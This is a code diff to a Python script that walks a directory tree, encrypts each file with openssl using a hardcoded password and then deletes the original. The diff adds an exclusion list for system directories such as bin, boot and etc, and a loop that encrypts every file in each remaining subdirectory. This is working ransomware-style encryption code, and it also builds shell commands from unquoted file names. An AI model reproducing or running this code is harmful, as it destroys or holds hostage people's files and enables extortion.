@@ -2,6 +2,8 @@ import os,sys
 
 aes_password="ricardo"
 keypath="/home/test2/random/keys"
+excluded_dirs=["bin","boot","etc","usr","lib","media"]
+
 
 def encrypt_(fname):
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
@@ -12,15 +14,22 @@ def encrypt_(fname):
 	os.system("rm "+fname)
 
 
+def enc_files(dir_):
+	onlyfiles = [f for f in os.listdir(dir_) if os.path.isfile(os.path.join(dir_, f))]
+	for f in onlyfiles:
+		file=os.path.join(dir_, f)
+		print "Encrypting",file,"..."
+		encrypt_(file)
+
 def loop(looped_dir):
-	for root, directories, filenames in os.walk(looped_dir):
+	for root,directories,filenames in os.walk(looped_dir):
 		for directory in directories:
 			dir=os.path.join(root, directory)
-			#print "Directory:",dir
-			loop(dir)
-	for filename in filenames:
-		fname=os.path.join(root,filename)
-		print "File:",fname
-		encrypt_(fname)
+			if directory not in excluded_dirs:
+				print "Entering",dir,"..."
+				enc_files(dir)
+
+	#			loop(dir)
+
 
 loop(sys.argv[1])
